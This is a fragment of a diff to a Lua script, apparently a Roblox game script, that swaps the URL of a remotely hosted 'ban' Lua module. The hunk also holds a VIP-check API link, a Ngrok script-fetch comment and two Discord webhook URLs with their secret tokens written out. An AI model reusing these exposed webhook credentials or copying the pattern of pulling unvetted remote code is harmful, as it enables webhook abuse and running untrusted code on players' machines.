@@ -66,7 +66,7 @@ local function TULUL_fake_script()
 	local API_URL = "https://v0-roblox-account-integration.vercel.app/api/vip/check"
 	local WEBHOOK_URL = "https://discord.com/api/webhooks/1555973037084639262/TBPW15Hhg0Q363vwcqKo74kLIoB47kqDD2xm3n4smE3Yg9FALo6knjNXyQM2Gd4sZgTn"
     local WEBHOOK_URL_main = "https://discord.com/api/webhooks/1565188324191117442/bVahMimYMX9tquQzGS1VQbKGqQE5cwT-rYnAtGYD51UkFJNQYBf2eugbck2rmaHMNfK-"
-	local BAN_URL = "https://raw.githubusercontent.com/soft972/ban/refs/heads/main/MODULE/S.lua"
+	local BAN_URL = "https://raw.githubusercontent.com/bryanaudinay921-ops/ban-touts/refs/heads/main/banroblox/G.lua"
 	
 	-- === CONFIGURATION MULTIVERSE (CORRIGÉE) ===
 	-- On ajoute bien /api/get_script à la fin du lien Ngrok
